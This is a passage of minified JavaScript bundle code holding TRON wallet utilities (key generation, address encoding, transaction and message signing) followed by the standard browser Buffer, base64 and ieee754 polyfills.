    n: FW,
    Gx: BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),
    Gy: BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),
    h: BigInt(1),
    lowS: !0,
    endo: {
        beta: BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),
        splitScalar: r => {
            const e = FW
              , t = BigInt("0x3086d221a7d46bcde86c90e49284eb15")
              , o = -ame * BigInt("0xe4437ed6010e88286f547fa90abfe4c3")
              , i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8")
              , n = t
              , s = BigInt("0x100000000000000000000000000000000")
              , a = UW(n * r, e)
              , l = UW(-o * r, e);
            let f = Mo(r - a * t - l * i, e)
              , h = Mo(-a * o - l * n, e);
            const p = f > s
              , b = h > s;
            if (p && (f = e - f),
            b && (h = e - h),
            f > s || h > s)
                throw new Error("splitScalar: Endomorphism failed, k=" + r);
            return {
                k1neg: p,
                k1: f,
                k2neg: b,
                k2: h
            }
        }
    }
}, Ibe);
BigInt(0);
xx.ProjectivePoint;
function lme(r) {
    return bo(mr(r).padStart(64, "0"))
}
function rl(r) {
    const e = Ys(r);
    let o = Ys(e).slice(0, 4);
    return o = r.concat(o),
    jF(o)
}
function QU(r) {
    if (typeof r != "string" || r.length <= 4)
        return !1;
    let e = nx(r);
    if (r.length <= 4)
        return !1;
    const o = e.length - 4
      , i = e.slice(o);
    e = e.slice(0, o);
    const n = Ys(e)
      , a = Ys(n).slice(0, 4);
    if (i[0] == a[0] && i[1] == a[1] && i[2] == a[2] && i[3] == a[3])
        return e;
    throw new Error("Invalid address provided")
}
function ume(r, e) {
    typeof r == "string" && (r = bo(r));
    const t = e.txID
      , o = R4(bo(t), r);
    return Array.isArray(e.signature) ? e.signature.includes(o) || e.signature.push(o) : e.signature = [o],
    e
}
function zA(r, e) {
    r = "0x" + r.replace(/^0x/, ""),
    e = "0x" + e.replace(/^0x/, "");
    const t = kd(DF(r), mo.from(e));
    return $i + t.substring(2)
}
function fme(r) {
    return btoa(String.fromCharCode(...r))
}
function dme(r, e) {
    typeof r == "string" && (r = bo(r));
    const t = Ys(e);
    return R4(t, r)
}
function hme(r, e, t, o) {
    const i = `0x${o.replace(/^0x/, "")}`
      , n = new li(i)
      , s = y1.hash(r, e, t)
      , a = n.sign(s);
    return ["0x", a.r.substring(2), a.s.substring(2), Number(a.v).toString(16)].join("")
}
function pme(r) {
    const e = Iu(r);
    return globalThis.proto.protocol.Transaction.deserializeBinary(e).getRawData().serializeBinary()
}
function ek() {
    const r = xx.utils.randomPrivateKey();
    let e = mr(r);
    return e = e.padStart(64, "0"),
    bo(e)
}
function L0(r) {
    r.length === 65 && (r = r.slice(1));
    const e = ir(new Uint8Array(r)).toString().substring(2)
      , t = $i + e.substring(24);
    return bo(t)
}
function wx(r) {
    const e = ah(r);
    return L0(e)
}
function gme(r) {
    const e = nx(r);
    if (e.length <= 4)
        return !1;
    const t = e.slice(0, e.length - 4)
      , o = Ys(t)
      , i = Ys(o);
    return i[0] === e[t.length] && i[1] === e[t.length + 1] && i[2] === e[t.length + 2] && i[3] === e[t.length + 3] ? t : !1
}
function tk(r) {
    if (typeof r != "string" || r.length !== FF)
        return !1;
    let e = nx(r);
    if (e.length !== 25 || e[0] !== UF)
        return !1;
    const t = e.slice(21);
    e = e.slice(0, 21);
    const o = Ys(e)
      , n = Ys(o).slice(0, 4);
    return t[0] == n[0] && t[1] == n[1] && t[2] == n[2] && t[3] == n[3]
}
function yme(r) {
    const e = Iu(r)
      , t = ah(e)
      , o = L0(t);
    return rl(o)
}
function bme(r) {
    const e = Iu(r)
      , t = ah(e)
      , o = L0(t);
    return mr(o)
}
function mme(r) {
    const e = Iu(r)
      , t = ah(e)
      , o = L0(t);
    return z3(o)
}
function ah(r) {
    const e = xx.ProjectivePoint.fromPrivateKey(new Uint8Array(lme(r)))
      , t = e.x
      , o = e.y
      , i = t.toString(16).padStart(64, "0")
      , n = o.toString(16).padStart(64, "0")
      , s = `04${i}${n}`;
    return bo(s)
}
function R4(r, e) {
    const t = xx.sign(mr(r), mr(e))
      , o = t.r.toString(16)
      , i = t.s.toString(16)
      , n = t.recovery + 27;
    return o.padStart(64, "0") + i.padStart(64, "0") + $1(n)
}
function Ys(r) {
    const e = mr(r)
      , t = no("0x" + e).replace(/^0x/, "");
    return bo(t)
}
function xme(r) {
    const e = Iu(r)
      , t = wx(e);
    return rl(t)
}
function vx(r, e=!1) {
    const t = bo(r, e)
      , o = wx(t);
    return rl(o)
}
function rk(r, e=!0) {
    return (e ? "0x" : "") + ir(Buffer.from(r, "utf-8")).toString().substring(2)
}
const wme = Object.freeze(Object.defineProperty({
    __proto__: null,
    ECKeySign: R4,
    SHA256: Ys,
    _signTypedData: hme,
    arrayToBase64String: fme,
    computeAddress: L0,
    decode58Check: gme,
    decodeBase58Address: QU,
    ecRecover: zA,
    genPriKey: ek,
    getAddressFromPriKey: wx,
    getAddressFromPriKeyBase64String: mme,
    getBase58CheckAddress: rl,
    getBase58CheckAddressFromPriKeyBase64String: yme,
    getHexStrAddressFromPriKeyBase64String: bme,
    getPubKeyFromPriKey: ah,
    getRowBytesFromTransactionBase64: pme,
    isAddressValid: tk,
    passwordToAddress: xme,
    pkToAddress: vx,
    sha3: rk,
    signBytes: dme,
    signTransaction: ume
}, Symbol.toStringTag, {
    value: "Module"
}))
  , vme = "Invalid tron path provided";
function Tme() {
    const r = ek()
      , e = ah(r)
      , t = wx(r)
      , o = mr(r)
      , i = mr(e);
    return {
        privateKey: o,
        publicKey: i,
        address: {
            base58: rl(t),
            hex: mr(t)
        }
    }
}
function Eme(r="", e=h4, t) {
    const o = Xp.createRandom(r, e, t);
    return {
        mnemonic: o.mnemonic,
        privateKey: o.privateKey,
        publicKey: o.signingKey.publicKey,
        address: vx(o.privateKey.replace(/^0x/, "")),
        path: o.path
    }
}
function Ame(r, e=h4, t="", o=null) {
    if (!String(e).match(/^m\/44\'\/195\'/))
        throw new Error(vme);
    const i = Xp.fromMnemonic(Kc.fromPhrase(r, t, o), e);
    return {
        mnemonic: i.mnemonic,
        privateKey: i.privateKey,
        publicKey: i.signingKey.publicKey,
        address: vx(i.privateKey.replace(/^0x/, ""))
    }
}
const Pme = Object.freeze(Object.defineProperty({
    __proto__: null,
    generateAccount: Tme,
    generateAccountWithMnemonic: Ame,
    generateRandom: Eme
}, Symbol.toStringTag, {
    value: "Module"
}))
  , nk = `TRON Signed Message:
`;
function W4(r) {
    return typeof r == "string" ? r = Fo(r) : Array.isArray(r) && (r = new Uint8Array(r)),
    ir(Ar([Fo(nk), Fo(String(r.length)), r]))
}
function Cme(r, e) {
    e.match(/^0x/) || (e = "0x" + e);
    const t = new li(e)
      , o = W4(r)
      , i = t.sign(o);
    return NF(i)
}
function Sme(r, e) {
    e.match(/^0x/) || (e = "0x" + e);
    const t = kd(W4(r), e);
    return rl(bo(t.replace(/^0x/, $i)))
}
const Bme = Object.freeze(Object.defineProperty({
    __proto__: null,
    TRON_MESSAGE_PREFIX: nk,
    hashMessage: W4,
    signMessage: Cme,
    verifyMessage: Sme
}, Symbol.toStringTag, {
    value: "Module"
}))
  , tt = {
    ...vue,
    address: gpe,
    code: Nce,
    accounts: Pme,
    base58: ype,
    bytes: _ce,
    crypto: wme,
    abi: Ege,
    message: Bme,
    _TypedDataEncoder: y1,
    transaction: Yye,
    ethersUtils: hpe
};
var kW;
(function(r) {
    r[r.BANDWIDTH = 0] = "BANDWIDTH",
    r[r.ENERGY = 1] = "ENERGY",
    r[r.TRON_POWER = 2] = "TRON_POWER"
}
)(kW || (kW = {}));
var LW;
(function(r) {
    r.ENOUGH_PERMISSION = "ENOUGH_PERMISSION",
    r.NOT_ENOUGH_PERMISSION = "NOT_ENOUGH_PERMISSION",
    r.SIGNATURE_FORMAT_ERROR = "SIGNATURE_FORMAT_ERROR",
    r.COMPUTE_ADDRESS_ERROR = "COMPUTE_ADDRESS_ERROR",
    r.PERMISSION_ERROR = "PERMISSION_ERROR",
    r.OTHER_ERROR = "OTHER_ERROR"
}
)(LW || (LW = {}));
var $W;
(function(r) {
    r[r.SUCCESS = 0] = "SUCCESS",
    r[r.SIGERROR = 1] = "SIGERROR",
    r[r.CONTRACT_VALIDATE_ERROR = 2] = "CONTRACT_VALIDATE_ERROR",
    r[r.CONTRACT_EXE_ERROR = 3] = "CONTRACT_EXE_ERROR",
    r[r.BANDWITH_ERROR = 4] = "BANDWITH_ERROR",
    r[r.DUP_TRANSACTION_ERROR = 5] = "DUP_TRANSACTION_ERROR",
    r[r.TAPOS_ERROR = 6] = "TAPOS_ERROR",
    r[r.TOO_BIG_TRANSACTION_ERROR = 7] = "TOO_BIG_TRANSACTION_ERROR",
    r[r.TRANSACTION_EXPIRATION_ERROR = 8] = "TRANSACTION_EXPIRATION_ERROR",
    r[r.SERVER_BUSY = 9] = "SERVER_BUSY",
    r[r.NO_CONNECTION = 10] = "NO_CONNECTION",
    r[r.NOT_ENOUGH_EFFECTIVE_CONNECTION = 11] = "NOT_ENOUGH_EFFECTIVE_CONNECTION",
    r[r.OTHER_ERROR = 20] = "OTHER_ERROR"
}
)($W || ($W = {}));
var zW;
(function(r) {
    r[r.PENDING = 0] = "PENDING",
    r[r.DISAPPROVED = 1] = "DISAPPROVED",
    r[r.APPROVED = 2] = "APPROVED",
    r[r.CANCELED = 3] = "CANCELED"
}
)(zW || (zW = {}));
var cE = {}, Ap = {}, jW;
function _me() {
    if (jW)
        return Ap;
    jW = 1,
    Ap.byteLength = a,
    Ap.toByteArray = f,
    Ap.fromByteArray = b;
    for (var r = [], e = [], t = typeof Uint8Array < "u" ? Uint8Array : Array, o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", i = 0, n = o.length; i < n; ++i)
        r[i] = o[i],
        e[o.charCodeAt(i)] = i;
    e[45] = 62,
    e[95] = 63;
    function s(v) {
        var T = v.length;
        if (T % 4 > 0)
            throw new Error("Invalid string. Length must be a multiple of 4");
        var x = v.indexOf("=");
        x === -1 && (x = T);
        var E = x === T ? 0 : 4 - x % 4;
        return [x, E]
    }
    function a(v) {
        var T = s(v)
          , x = T[0]
          , E = T[1];
        return (x + E) * 3 / 4 - E
    }
    function l(v, T, x) {
        return (T + x) * 3 / 4 - x
    }
    function f(v) {
        var T, x = s(v), E = x[0], B = x[1], P = new t(l(v, E, B)), O = 0, F = B > 0 ? E - 4 : E, D;
        for (D = 0; D < F; D += 4)
            T = e[v.charCodeAt(D)] << 18 | e[v.charCodeAt(D + 1)] << 12 | e[v.charCodeAt(D + 2)] << 6 | e[v.charCodeAt(D + 3)],
            P[O++] = T >> 16 & 255,
            P[O++] = T >> 8 & 255,
            P[O++] = T & 255;
        return B === 2 && (T = e[v.charCodeAt(D)] << 2 | e[v.charCodeAt(D + 1)] >> 4,
        P[O++] = T & 255),
        B === 1 && (T = e[v.charCodeAt(D)] << 10 | e[v.charCodeAt(D + 1)] << 4 | e[v.charCodeAt(D + 2)] >> 2,
        P[O++] = T >> 8 & 255,
        P[O++] = T & 255),
        P
    }
    function h(v) {
        return r[v >> 18 & 63] + r[v >> 12 & 63] + r[v >> 6 & 63] + r[v & 63]
    }
    function p(v, T, x) {
        for (var E, B = [], P = T; P < x; P += 3)
            E = (v[P] << 16 & 16711680) + (v[P + 1] << 8 & 65280) + (v[P + 2] & 255),
            B.push(h(E));
        return B.join("")
    }
    function b(v) {
        for (var T, x = v.length, E = x % 3, B = [], P = 16383, O = 0, F = x - E; O < F; O += P)
            B.push(p(v, O, O + P > F ? F : O + P));
        return E === 1 ? (T = v[x - 1],
        B.push(r[T >> 2] + r[T << 4 & 63] + "==")) : E === 2 && (T = (v[x - 2] << 8) + v[x - 1],
        B.push(r[T >> 10] + r[T >> 4 & 63] + r[T << 2 & 63] + "=")),
        B.join("")
    }
    return Ap
}
var hm = {};
/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */
var qW;
function Ime() {
    return qW || (qW = 1,
    hm.read = function(r, e, t, o, i) {
        var n, s, a = i * 8 - o - 1, l = (1 << a) - 1, f = l >> 1, h = -7, p = t ? i - 1 : 0, b = t ? -1 : 1, v = r[e + p];
        for (p += b,
        n = v & (1 << -h) - 1,
        v >>= -h,
        h += a; h > 0; n = n * 256 + r[e + p],
        p += b,
        h -= 8)
            ;
        for (s = n & (1 << -h) - 1,
        n >>= -h,
        h += o; h > 0; s = s * 256 + r[e + p],
        p += b,
        h -= 8)
            ;
        if (n === 0)
            n = 1 - f;
        else {
            if (n === l)
                return s ? NaN : (v ? -1 : 1) * (1 / 0);
            s = s + Math.pow(2, o),
            n = n - f
        }
        return (v ? -1 : 1) * s * Math.pow(2, n - o)
    }
    ,
    hm.write = function(r, e, t, o, i, n) {
        var s, a, l, f = n * 8 - i - 1, h = (1 << f) - 1, p = h >> 1, b = i === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0, v = o ? 0 : n - 1, T = o ? 1 : -1, x = e < 0 || e === 0 && 1 / e < 0 ? 1 : 0;
        for (e = Math.abs(e),
        isNaN(e) || e === 1 / 0 ? (a = isNaN(e) ? 1 : 0,
        s = h) : (s = Math.floor(Math.log(e) / Math.LN2),
        e * (l = Math.pow(2, -s)) < 1 && (s--,
        l *= 2),
        s + p >= 1 ? e += b / l : e += b * Math.pow(2, 1 - p),
        e * l >= 2 && (s++,
        l /= 2),
        s + p >= h ? (a = 0,
        s = h) : s + p >= 1 ? (a = (e * l - 1) * Math.pow(2, i),
        s = s + p) : (a = e * Math.pow(2, p - 1) * Math.pow(2, i),
        s = 0)); i >= 8; r[t + v] = a & 255,
        v += T,
        a /= 256,
        i -= 8)
            ;
        for (s = s << i | a,
        f += i; f > 0; r[t + v] = s & 255,
        v += T,
        s /= 256,
        f -= 8)
            ;
        r[t + v - T] |= x * 128
    }
    ),
    hm
}
/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */
var VW;
function Ome() {
    return VW || (VW = 1,
    function(r) {
        const e = _me()
          , t = Ime()
          , o = typeof Symbol == "function" && typeof Symbol.for == "function" ? Symbol.for("nodejs.util.inspect.custom") : null;
        r.Buffer = a,
        r.SlowBuffer = P,
        r.INSPECT_MAX_BYTES = 50;
        const i = 2147483647;
        r.kMaxLength = i,
        a.TYPED_ARRAY_SUPPORT = n(),
        !a.TYPED_ARRAY_SUPPORT && typeof console < "u" && typeof console.error == "function" && console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");
        function n() {
            try {
                const Z = new Uint8Array(1)
                  , N = {
                    foo: function() {
                        return 42
                    }
                };
                return Object.setPrototypeOf(N, Uint8Array.prototype),
                Object.setPrototypeOf(Z, N),
                Z.foo() === 42
            } catch {
                return !1
            }
        }
        Object.defineProperty(a.prototype, "parent", {
            enumerable: !0,
            get: function() {
                if (a.isBuffer(this))
                    return this.buffer
            }
        }),
        Object.defineProperty(a.prototype, "offset", {
            enumerable: !0,
            get: function() {
                if (a.isBuffer(this))
                    return this.byteOffset
            }
        });
        function s(Z) {
            if (Z > i)
                throw new RangeError('The value "' + Z + '" is invalid for option "size"');
            const N = new Uint8Array(Z);
            return Object.setPrototypeOf(N, a.prototype),
            N
        }
        function a(Z, N, U) {
            if (typeof Z == "number") {
                if (typeof N == "string")
                    throw new TypeError('The "string" argument must be of type string. Received type number');
                return p(Z)
            }
            return l(Z, N, U)
        }
        a.poolSize = 8192;
        function l(Z, N, U) {
            if (typeof Z == "string")
                return b(Z, N);
            if (ArrayBuffer.isView(Z))
                return T(Z);
            if (Z == null)
                throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof Z);
            if (Re(Z, ArrayBuffer) || Z && Re(Z.buffer, ArrayBuffer) || typeof SharedArrayBuffer < "u" && (Re(Z, SharedArrayBuffer) || Z && Re(Z.buffer, SharedArrayBuffer)))
                return x(Z, N, U);
            if (typeof Z == "number")
                throw new TypeError('The "value" argument must not be of type number. Received type number');
            const ne = Z.valueOf && Z.valueOf();
            if (ne != null && ne !== Z)
                return a.from(ne, N, U);
            const J = E(Z);
            if (J)
                return J;
            if (typeof Symbol < "u" && Symbol.toPrimitive != null && typeof Z[Symbol.toPrimitive] == "function")
                return a.from(Z[Symbol.toPrimitive]("string"), N, U);
            throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof Z)
        }
        a.from = function(Z, N, U) {
            return l(Z, N, U)
        }
        ,
        Object.setPrototypeOf(a.prototype, Uint8Array.prototype),
        Object.setPrototypeOf(a, Uint8Array);
        function f(Z) {
            if (typeof Z != "number")
                throw new TypeError('"size" argument must be of type number');
            if (Z < 0)
                throw new RangeError('The value "' + Z + '" is invalid for option "size"')
        }
        function h(Z, N, U) {
            return f(Z),
            Z <= 0 ? s(Z) : N !== void 0 ? typeof U == "string" ? s(Z).fill(N, U) : s(Z).fill(N) : s(Z)
        }
        a.alloc = function(Z, N, U) {
            return h(Z, N, U)
        }
        ;
        function p(Z) {
            return f(Z),
            s(Z < 0 ? 0 : B(Z) | 0)
        }
        a.allocUnsafe = function(Z) {
            return p(Z)
        }
        ,
        a.allocUnsafeSlow = function(Z) {
            return p(Z)
        }
        ;
        function b(Z, N) {
            if ((typeof N != "string" || N === "") && (N = "utf8"),
            !a.isEncoding(N))
                throw new TypeError("Unknown encoding: " + N);
            const U = O(Z, N) | 0;
            let ne = s(U);
            const J = ne.write(Z, N);
            return J !== U && (ne = ne.slice(0, J)),
            ne
        }
        function v(Z) {
            const N = Z.length < 0 ? 0 : B(Z.length) | 0
              , U = s(N);
            for (let ne = 0; ne < N; ne += 1)
                U[ne] = Z[ne] & 255;
            return U
        }
        function T(Z) {
            if (Re(Z, Uint8Array)) {
                const N = new Uint8Array(Z);
                return x(N.buffer, N.byteOffset, N.byteLength)
            }
            return v(Z)
        }
        function x(Z, N, U) {
            if (N < 0 || Z.byteLength < N)
                throw new RangeError('"offset" is outside of buffer bounds');
            if (Z.byteLength < N + (U || 0))
                throw new RangeError('"length" is outside of buffer bounds');
            let ne;
            return N === void 0 && U === void 0 ? ne = new Uint8Array(Z) : U === void 0 ? ne = new Uint8Array(Z,N) : ne = new Uint8Array(Z,N,U),
            Object.setPrototypeOf(ne, a.prototype),
            ne
        }
        function E(Z) {
            if (a.isBuffer(Z)) {
                const N = B(Z.length) | 0
                  , U = s(N);
                return U.length === 0 || Z.copy(U, 0, 0, N),
                U
            }
            if (Z.length !== void 0)
                return typeof Z.length != "number" || $e(Z.length) ? s(0) : v(Z);
            if (Z.type === "Buffer" && Array.isArray(Z.data))
                return v(Z.data)
        }
        function B(Z) {
            if (Z >= i)
                throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + i.toString(16) + " bytes");
            return Z | 0
        }
        function P(Z) {
            return +Z != Z && (Z = 0),
            a.alloc(+Z)
        }
        a.isBuffer = function(N) {
            return N != null && N._isBuffer === !0 && N !== a.prototype
        }
        ,
        a.compare = function(N, U) {
            if (Re(N, Uint8Array) && (N = a.from(N, N.offset, N.byteLength)),
            Re(U, Uint8Array) && (U = a.from(U, U.offset, U.byteLength)),
            !a.isBuffer(N) || !a.isBuffer(U))
                throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
            if (N === U)
                return 0;
            let ne = N.length
              , J = U.length;
            for (let Ee = 0, Ie = Math.min(ne, J); Ee < Ie; ++Ee)
                if (N[Ee] !== U[Ee]) {
                    ne = N[Ee],
                    J = U[Ee];
                    break
                }
            return ne < J ? -1 : J < ne ? 1 : 0
        }
        ,
        a.isEncoding = function(N) {
            switch (String(N).toLowerCase()) {
            case "hex":
            case "utf8":
            case "utf-8":
            case "ascii":
            case "latin1":
            case "binary":
            case "base64":
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
                return !0;
            default:
                return !1
            }
        }
        ,
        a.concat = function(N, U) {
            if (!Array.isArray(N))
                throw new TypeError('"list" argument must be an Array of Buffers');
            if (N.length === 0)
                return a.alloc(0);
            let ne;
            if (U === void 0)
                for (U = 0,
                ne = 0; ne < N.length; ++ne)
                    U += N[ne].length;
            const J = a.allocUnsafe(U);
            let Ee = 0;
            for (ne = 0; ne < N.length; ++ne) {
                let Ie = N[ne];
                if (Re(Ie, Uint8Array))
                    Ee + Ie.length > J.length ? (a.isBuffer(Ie) || (Ie = a.from(Ie)),
                    Ie.copy(J, Ee)) : Uint8Array.prototype.set.call(J, Ie, Ee);
                else if (a.isBuffer(Ie))
                    Ie.copy(J, Ee);
                else
                    throw new TypeError('"list" argument must be an Array of Buffers');
                Ee += Ie.length
            }
            return J
        }
        ;
        function O(Z, N) {
            if (a.isBuffer(Z))
                return Z.length;
            if (ArrayBuffer.isView(Z) || Re(Z, ArrayBuffer))
                return Z.byteLength;
            if (typeof Z != "string")
                throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof Z);
            const U = Z.length
              , ne = arguments.length > 2 && arguments[2] === !0;
            if (!ne && U === 0)
                return 0;
            let J = !1;
            for (; ; )
                switch (N) {
                case "ascii":
                case "latin1":
                case "binary":
                    return U;
                case "utf8":
                case "utf-8":
                    return Cr(Z).length;
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return U * 2;
                case "hex":
                    return U >>> 1;
                case "base64":
                    return Te(Z).length;
                default:
                    if (J)
                        return ne ? -1 : Cr(Z).length;
                    N = ("" + N).toLowerCase(),
                    J = !0
                }
        }
        a.byteLength = O;
        function F(Z, N, U) {
            let ne = !1;
            if ((N === void 0 || N < 0) && (N = 0),
            N > this.length || ((U === void 0 || U > this.length) && (U = this.length),
            U <= 0) || (U >>>= 0,
            N >>>= 0,
            U <= N))
                return "";
            for (Z || (Z = "utf8"); ; )
                switch (Z) {
                case "hex":
                    return K(this, N, U);
                case "utf8":
                case "utf-8":
                    return V(this, N, U);
                case "ascii":
                    return $(this, N, U);
                case "latin1":
                case "binary":
                    return z(this, N, U);
                case "base64":
                    return Y(this, N, U);
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return j(this, N, U);
                default:
                    if (ne)
                        throw new TypeError("Unknown encoding: " + Z);
                    Z = (Z + "").toLowerCase(),
                    ne = !0
                }
        }
        a.prototype._isBuffer = !0;
        function D(Z, N, U) {
            const ne = Z[N];
            Z[N] = Z[U],
            Z[U] = ne
        }
        a.prototype.swap16 = function() {
            const N = this.length;
            if (N % 2 !== 0)
                throw new RangeError("Buffer size must be a multiple of 16-bits");
            for (let U = 0; U < N; U += 2)
                D(this, U, U + 1);
            return this
        }
        ,
        a.prototype.swap32 = function() {
            const N = this.length;
            if (N % 4 !== 0)
                throw new RangeError("Buffer size must be a multiple of 32-bits");
            for (let U = 0; U < N; U += 4)
                D(this, U, U + 3),
                D(this, U + 1, U + 2);
            return this
        }
        ,
        a.prototype.swap64 = function() {
            const N = this.length;
            if (N % 8 !== 0)
                throw new RangeError("Buffer size must be a multiple of 64-bits");
            for (let U = 0; U < N; U += 8)
                D(this, U, U + 7),
                D(this, U + 1, U + 6),
                D(this, U + 2, U + 5),
                D(this, U + 3, U + 4);
            return this
        }
        ,
        a.prototype.toString = function() {
            const N = this.length;
            return N === 0 ? "" : arguments.length === 0 ? V(this, 0, N) : F.apply(this, arguments)
        }
        ,
        a.prototype.toLocaleString = a.prototype.toString,
        a.prototype.equals = function(N) {
            if (!a.isBuffer(N))
                throw new TypeError("Argument must be a Buffer");
            return this === N ? !0 : a.compare(this, N) === 0
        }
        ,
        a.prototype.inspect = function() {
            let N = "";
            const U = r.INSPECT_MAX_BYTES;
            return N = this.toString("hex", 0, U).replace(/(.{2})/g, "$1 ").trim(),
            this.length > U && (N += " ... "),
            "<Buffer " + N + ">"
        }
        ,
        o && (a.prototype[o] = a.prototype.inspect),
        a.prototype.compare = function(N, U, ne, J, Ee) {
            if (Re(N, Uint8Array) && (N = a.from(N, N.offset, N.byteLength)),
            !a.isBuffer(N))
                throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof N);
            if (U === void 0 && (U = 0),
            ne === void 0 && (ne = N ? N.length : 0),
            J === void 0 && (J = 0),
            Ee === void 0 && (Ee = this.length),
            U < 0 || ne > N.length || J < 0 || Ee > this.length)
                throw new RangeError("out of range index");
            if (J >= Ee && U >= ne)
                return 0;
            if (J >= Ee)
                return -1;
            if (U >= ne)
                return 1;
            if (U >>>= 0,
            ne >>>= 0,
            J >>>= 0,
            Ee >>>= 0,
            this === N)
                return 0;
            let Ie = Ee - J
              , re = ne - U;
            const Nt = Math.min(Ie, re)
              , Yt = this.slice(J, Ee)
              , wt = N.slice(U, ne);
            for (let zt = 0; zt < Nt; ++zt)
                if (Yt[zt] !== wt[zt]) {
                    Ie = Yt[zt],
                    re = wt[zt];
                    break
                }
            return Ie < re ? -1 : re < Ie ? 1 : 0
        }
        ;
        function I(Z, N, U, ne, J) {
            if (Z.length === 0)
                return -1;
            if (typeof U == "string" ? (ne = U,
            U = 0) : U > 2147483647 ? U = 2147483647 : U < -2147483648 && (U = -2147483648),
            U = +U,
            $e(U) && (U = J ? 0 : Z.length - 1),
            U < 0 && (U = Z.length + U),
            U >= Z.length) {
                if (J)
                    return -1;
                U = Z.length - 1
            } else if (U < 0)
                if (J)
                    U = 0;
                else
                    return -1;
            if (typeof N == "string" && (N = a.from(N, ne)),
            a.isBuffer(N))
                return N.length === 0 ? -1 : M(Z, N, U, ne, J);
            if (typeof N == "number")
                return N = N & 255,
                typeof Uint8Array.prototype.indexOf == "function" ? J ? Uint8Array.prototype.indexOf.call(Z, N, U) : Uint8Array.prototype.lastIndexOf.call(Z, N, U) : M(Z, [N], U, ne, J);
            throw new TypeError("val must be string, number or Buffer")
        }
        function M(Z, N, U, ne, J) {
            let Ee = 1
              , Ie = Z.length
              , re = N.length;
            if (ne !== void 0 && (ne = String(ne).toLowerCase(),
            ne === "ucs2" || ne === "ucs-2" || ne === "utf16le" || ne === "utf-16le")) {
                if (Z.length < 2 || N.length < 2)
                    return -1;
                Ee = 2,
                Ie /= 2,
                re /= 2,
                U /= 2
            }
            function Nt(wt, zt) {
                return Ee === 1 ? wt[zt] : wt.readUInt16BE(zt * Ee)
            }
            let Yt;
            if (J) {
                let wt = -1;
                for (Yt = U; Yt < Ie; Yt++)
                    if (Nt(Z, Yt) === Nt(N, wt === -1 ? 0 : Yt - wt)) {
                        if (wt === -1 && (wt = Yt),
                        Yt - wt + 1 === re)
                            return wt * Ee
                    } else
                        wt !== -1 && (Yt -= Yt - wt),
                        wt = -1
            } else
                for (U + re > Ie && (U = Ie - re),
                Yt = U; Yt >= 0; Yt--) {
                    let wt = !0;
                    for (let zt = 0; zt < re; zt++)
                        if (Nt(Z, Yt + zt) !== Nt(N, zt)) {
                            wt = !1;
                            break
                        }
                    if (wt)
                        return Yt
                }
            return -1
        }
        a.prototype.includes = function(N, U, ne) {
            return this.indexOf(N, U, ne) !== -1
        }
        ,
        a.prototype.indexOf = function(N, U, ne) {
            return I(this, N, U, ne, !0)
        }
        ,
        a.prototype.lastIndexOf = function(N, U, ne) {
            return I(this, N, U, ne, !1)
        }
        ;
        function C(Z, N, U, ne) {
            U = Number(U) || 0;
            const J = Z.length - U;
            ne ? (ne = Number(ne),
            ne > J && (ne = J)) : ne = J;
            const Ee = N.length;
            ne > Ee / 2 && (ne = Ee / 2);
            let Ie;
            for (Ie = 0; Ie < ne; ++Ie) {
                const re = parseInt(N.substr(Ie * 2, 2), 16);
                if ($e(re))
                    return Ie;
                Z[U + Ie] = re
            }
            return Ie
        }
        function W(Z, N, U, ne) {
            return Ue(Cr(N, Z.length - U), Z, U, ne)
        }
        function k(Z, N, U, ne) {
            return Ue(se(N), Z, U, ne)
        }
        function H(Z, N, U, ne) {
            return Ue(Te(N), Z, U, ne)
        }
        function X(Z, N, U, ne) {
            return Ue(le(N, Z.length - U), Z, U, ne)
        }
        a.prototype.write = function(N, U, ne, J) {
            if (U === void 0)
                J = "utf8",
                ne = this.length,
                U = 0;
            else if (ne === void 0 && typeof U == "string")
                J = U,
                ne = this.length,
                U = 0;
            else if (isFinite(U))
                U = U >>> 0,
                isFinite(ne) ? (ne = ne >>> 0,
                J === void 0 && (J = "utf8")) : (J = ne,
                ne = void 0);
            else
                throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
            const Ee = this.length - U;
            if ((ne === void 0 || ne > Ee) && (ne = Ee),
            N.length > 0 && (ne < 0 || U < 0) || U > this.length)
                throw new RangeError("Attempt to write outside buffer bounds");
            J || (J = "utf8");
            let Ie = !1;
            for (; ; )
                switch (J) {
                case "hex":
                    return C(this, N, U, ne);
                case "utf8":
                case "utf-8":
                    return W(this, N, U, ne);
                case "ascii":
                case "latin1":
                case "binary":
                    return k(this, N, U, ne);
                case "base64":
                    return H(this, N, U, ne);
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return X(this, N, U, ne);
                default:
                    if (Ie)
                        throw new TypeError("Unknown encoding: " + J);
                    J = ("" + J).toLowerCase(),
                    Ie = !0
                }
        }
        ,
        a.prototype.toJSON = function() {
            return {
                type: "Buffer",
                data: Array.prototype.slice.call(this._arr || this, 0)
            }
        }
        ;
        function Y(Z, N, U) {
            return N === 0 && U === Z.length ? e.fromByteArray(Z) : e.fromByteArray(Z.slice(N, U))
        }
        function V(Z, N, U) {
            U = Math.min(Z.length, U);
            const ne = [];
            let J = N;
            for (; J < U; ) {
                const Ee = Z[J];
                let Ie = null
